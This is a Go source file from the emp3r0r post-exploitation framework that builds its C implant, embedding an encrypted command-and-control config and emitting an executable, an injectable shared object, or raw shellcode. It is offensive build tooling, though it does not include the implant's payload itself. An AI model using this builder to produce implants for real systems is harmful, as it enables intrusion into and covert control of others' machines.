package builder

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"time"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/tools"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/cagent"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// C agent provider choices select which backend the on-demand Makefile links
// (see core/c_agent/Makefile). They mirror the Makefile's <GROUP>=<name>
// model; the default for each group is the first entry.
var (
	CAgentCryptoProviders    = []string{"openssl", "mbedtls"}
	CAgentGzipProviders      = []string{"miniz", "none"}
	CAgentTransportProviders = []string{"libcurl", "http_raw", "libssl"}
	// DYNLOAD_MODE picks the libc symbols dynload resolves: libc_dl
	// (__libc_dlopen_mode, glibc < 2.34), public (dlopen, glibc >= 2.34) or
	// auto (libc_dl with a runtime fallback to the public names).
	CAgentDynloadModes = []string{"libc_dl", "public", "auto"}
	// GLIBC_VERSION pins the oldest glibc ABI to link against. It is
	// independent of DYNLOAD_MODE; 2.17 is the oldest the project supports.
	CAgentGlibcVersions = []string{"2.17", "2.34"}
	// LIBC picks the C library the hosted agent links: glibc (pinned via
	// GLIBC_VERSION) or musl (zig's bundled musl, stable ABI).
	CAgentLibcs = []string{"glibc", "musl"}
	// CAgentArches are the Linux targets the C agent Makefile knows how to
	// map to a zig target. The operator command exposes --arch independently
	// of the Go agent's ArchListAll so C-only toolchain targets can be added
	// without widening what the Go builder accepts.
	CAgentArches = []string{"amd64", "386", "arm", "arm64", "riscv64"}
	// CAgentFormats selects the artifact the build produces: a hosted
	// executable, a shared object (dlopen/injection), or the shared object
	// wrapped as malasada raw PIC (shellcode).
	CAgentFormats = []string{"exe", "so", "shellcode"}
)

// CAgentProviders selects the providers the built C agent links. Empty fields
// keep the Makefile default.
type CAgentProviders struct {
	Crypto    string // CRYPTO=
	Gzip      string // GZIP=
	Transport string // TRANSPORT=
	Dynload   string // DYNLOAD_MODE=
	Glibc     string // GLIBC_VERSION=
	Libc      string // LIBC=
	Arch      string // ARCH=
	Format    string // exe|so|shellcode (post-build artifact)
}

// cAgentProviderSpec maps one operator choice to its Makefile variable. A
// single table drives both validation and the make argument vector, so adding
// a provider dimension cannot leave one of them out of sync.
type cAgentProviderSpec struct {
	group   string // operator-facing name, used in errors
	varname string // Makefile variable name
	value   string
	allowed []string
}

func cAgentProviderSpecs(p CAgentProviders) []cAgentProviderSpec {
	return []cAgentProviderSpec{
		{group: "arch", varname: "ARCH", value: p.Arch, allowed: CAgentArches},
		{group: "crypto", varname: "CRYPTO", value: p.Crypto, allowed: CAgentCryptoProviders},
		{group: "gzip", varname: "GZIP", value: p.Gzip, allowed: CAgentGzipProviders},
		{group: "transport", varname: "TRANSPORT", value: p.Transport, allowed: CAgentTransportProviders},
		{group: "dynload", varname: "DYNLOAD_MODE", value: p.Dynload, allowed: CAgentDynloadModes},
		{group: "glibc", varname: "GLIBC_VERSION", value: p.Glibc, allowed: CAgentGlibcVersions},
		{group: "libc", varname: "LIBC", value: p.Libc, allowed: CAgentLibcs},
	}
}

// cAgentSourceDir is the on-demand C agent source shipped with the operator kit
// (core/build.py copies core/c_agent to <prefix>/lib/emp3r0r/c_agent).
func cAgentSourceDir() string {
	return filepath.Join(live.EmpDataDir, "c_agent")
}

// stageCAgentSource copies the parts of the installed C agent tree the Makefile
// needs into a writable directory. Only the build inputs are copied, so no
// stale build/ output can leak into the new build.
func stageCAgentSource(srcDir, dstDir string) error {
	if err := os.MkdirAll(dstDir, 0o755); err != nil {
		return fmt.Errorf("create %s: %w", dstDir, err)
	}
	for _, name := range []string{"Makefile", "src", "include", "vendor"} {
		src := filepath.Join(srcDir, name)
		if !util.IsExist(src) {
			return fmt.Errorf("C agent source %s is missing %s (rebuild the operator kit)", srcDir, name)
		}
		if err := copyStageSource(src, filepath.Join(dstDir, name)); err != nil {
			return fmt.Errorf("stage C agent %s: %w", name, err)
		}
	}
	return nil
}

// copyStageSource copies a file or directory, creating directories with writable
// permissions regardless of the source mode (the installed tree is often
// read-only, and a copy must be buildable).
func copyStageSource(src, dst string) error {
	info, err := os.Lstat(src)
	if err != nil {
		return err
	}
	if !info.IsDir() {
		data, err := os.ReadFile(src)
		if err != nil {
			return err
		}
		return os.WriteFile(dst, data, 0o644)
	}
	if err := os.MkdirAll(dst, 0o755); err != nil {
		return err
	}
	entries, err := os.ReadDir(src)
	if err != nil {
		return err
	}
	for _, entry := range entries {
		if err := copyStageSource(filepath.Join(src, entry.Name()), filepath.Join(dst, entry.Name())); err != nil {
			return err
		}
	}
	return nil
}

func validateCAgentProviders(p CAgentProviders) error {
	for _, spec := range cAgentProviderSpecs(p) {
		if spec.value == "" {
			continue
		}
		valid := false
		for _, a := range spec.allowed {
			if a == spec.value {
				valid = true
				break
			}
		}
		if !valid {
			return fmt.Errorf("invalid %s provider %q (available: %v)", spec.group, spec.value, spec.allowed)
		}
	}
	// musl has no libdl and no __libc_dl* names: the public dlopen/dlsym/
	// dlclose are exported by the loader/libc segment itself, so public is the
	// only mode that can resolve.
	if p.Libc == "musl" && p.Dynload != "" && p.Dynload != "public" {
		return fmt.Errorf("libc musl only provides the public dl* symbols; use dynload=public")
	}
	if p.Format != "" && !slices.Contains(CAgentFormats, p.Format) {
		return fmt.Errorf("invalid format %q (available: %v)", p.Format, CAgentFormats)
	}
	// malasada's stage0 resolves glibc's ld-linux by hardcoded path for x86_64,
	// so raw PIC is glibc/amd64-only. The shared objects themselves are fine on
	// every supported C agent target.
	if p.Format == "shellcode" {
		if p.Libc == "musl" {
			return fmt.Errorf("raw PIC (malasada) is glibc-only; use format=exe or so with libc=musl")
		}
		if p.Arch != "" && p.Arch != "amd64" {
			return fmt.Errorf("raw PIC (malasada) is amd64-only; use format=exe or so with arch=%s", p.Arch)
		}
	}
	// zig cannot provide glibc for riscv64 at the project's oldest supported
	// ABI (2.17); the C agent follows the module toolchain and uses musl there.
	if p.Arch == "riscv64" && p.Libc == "glibc" {
		return fmt.Errorf("arch riscv64 requires libc musl: zig has no riscv64 glibc 2.17 target")
	}
	return nil
}

// cAgentMakeTarget maps a format to the Makefile target that produces its
// intermediate artifact: the executable, or the shared object that malasada
// wraps for raw PIC.
func cAgentMakeTarget(format string) string {
	if format == "so" || format == "shellcode" {
		return "so"
	}
	return "agent"
}

// cAgentBuildArgs is the deterministic `make` argument vector for the on-demand
// agent build. configSrc is the Go-rendered C translation unit carrying the
// encrypted config and magic string (see cagent.EmbeddedConfigSource). Kept
// pure so it can be unit tested without invoking make.
func cAgentBuildArgs(srcDir, configSrc string, p CAgentProviders) []string {
	args := []string{
		"-C", srcDir, cAgentMakeTarget(p.Format),
		"CONFIG_SRC=" + configSrc,
	}
	for _, spec := range cAgentProviderSpecs(p) {
		if spec.value != "" {
			args = append(args, spec.varname+"="+spec.value)
		}
	}
	return args
}

// GenerateCAgentWorkflow builds core/c_agent's reference agent. It reuses the
// Go generator's config plumbing (MakeConfig + EncryptAgentConfig), so the
// embedded config is encrypted under the same MagicString the C2 is using and
// the C agent talks to exactly the same C2.
func GenerateCAgentWorkflow(opts AgentConfig, providers CAgentProviders, signAgentFn func(uuid string) (string, error)) (*BuildAgentResult, error) {
	if err := validateCAgentProviders(providers); err != nil {
		return nil, err
	}
	if err := MakeConfig(opts); err != nil {
		return nil, fmt.Errorf("configure agent: %w", err)
	}

	srcDir := cAgentSourceDir()
	if !util.IsFileExist(filepath.Join(srcDir, "Makefile")) {
		return nil, fmt.Errorf("C agent source not found at %s (rebuild the operator kit)", srcDir)
	}

	agentUUID := uuid.NewString()
	var sig string
	var err error
	if signAgentFn != nil {
		sig, err = signAgentFn(agentUUID)
		if err != nil {
			return nil, fmt.Errorf("sign agent UUID: %w", err)
		}
	}

	// Encrypted CBOR config, byte-identical to what a Go agent would carry.
	payload, _, err := EncryptAgentConfig(AgentBuildConfig{
		AgentUUID:    agentUUID,
		AgentUUIDSig: sig,
	})
	if err != nil {
		return nil, fmt.Errorf("encrypt config: %w", err)
	}

	// Build from a writable copy of the installed source. The install prefix is
	// often read-only (e.g. /usr), and both the agent build and a CRYPTO=mbedtls
	// build write into the source tree (build/, vendor/mbedtls/library/). The
	// embedded config is rendered into the copy and compiled via CONFIG_SRC, so
	// building needs no Python or Go toolchain on the operator host.
	workRoot, err := os.MkdirTemp(live.EmpWorkSpace, "c_agent_build_")
	if err != nil {
		return nil, fmt.Errorf("create build workspace: %w", err)
	}
	defer os.RemoveAll(workRoot)

	buildSrc := filepath.Join(workRoot, "c_agent")
	if err := stageCAgentSource(srcDir, buildSrc); err != nil {
		return nil, err
	}
	buildDir := filepath.Join(buildSrc, "build")
	if err := os.MkdirAll(buildDir, 0o755); err != nil {
		return nil, fmt.Errorf("create build dir: %w", err)
	}
	configSrcPath := filepath.Join(buildDir, "config_embedded.c")
	if err := os.WriteFile(configSrcPath, cagent.EmbeddedConfigSource(payload, def.MagicString, def.BuildVersion), 0o600); err != nil {
		return nil, fmt.Errorf("write config source: %w", err)
	}

	// Build with the pinned zig toolchain the kit ships (the Makefile default).
	build := exec.Command("make", cAgentBuildArgs(buildSrc, configSrcPath, providers)...)
	build.Dir = buildSrc
	if out, buildErr := build.CombinedOutput(); buildErr != nil {
		return nil, fmt.Errorf("build C agent: %w\n%s", buildErr, out)
	}

	// The executable and the shared object are distinct make outputs; raw PIC is
	// the shared object wrapped by malasada.
	built := filepath.Join(buildDir, "agent")
	if cAgentMakeTarget(providers.Format) == "so" {
		built = filepath.Join(buildDir, "agent.so")
	}
	if !util.IsFileExist(built) {
		return nil, fmt.Errorf("build reported success but %s was not produced", built)
	}

	now := time.Now()
	arch := providers.Arch
	if arch == "" {
		arch = CAgentArches[0]
	}
	outFile := filepath.Join(live.EmpWorkSpace, fmt.Sprintf("aquila_linux_%s_%d-%d-%d_%d-%d-%d",
		arch, now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second()))
	var data []byte
	switch providers.Format {
	case "so":
		outFile += ".so"
		if data, err = os.ReadFile(built); err != nil {
			return nil, fmt.Errorf("read built C agent: %w", err)
		}
	case "shellcode":
		// malasada turns the PIC shared object into a loader-wrapped raw PIC
		// blob; the exported entry is main (see agent.c).
		outFile += ".bin"
		if data, err = tools.ConvertSharedObjectToShellcode(built, "main", true); err != nil {
			return nil, fmt.Errorf("convert C agent to shellcode: %w", err)
		}
	default:
		if data, err = os.ReadFile(built); err != nil {
			return nil, fmt.Errorf("read built C agent: %w", err)
		}
	}
	if err := os.WriteFile(outFile, data, 0o755); err != nil {
		return nil, fmt.Errorf("write C agent: %w", err)
	}

	return &BuildAgentResult{
		StubFile:   srcDir,
		OutputFile: outFile,
		AgentUUID:  agentUUID,
		ConfigSize: len(payload),
	}, nil
}
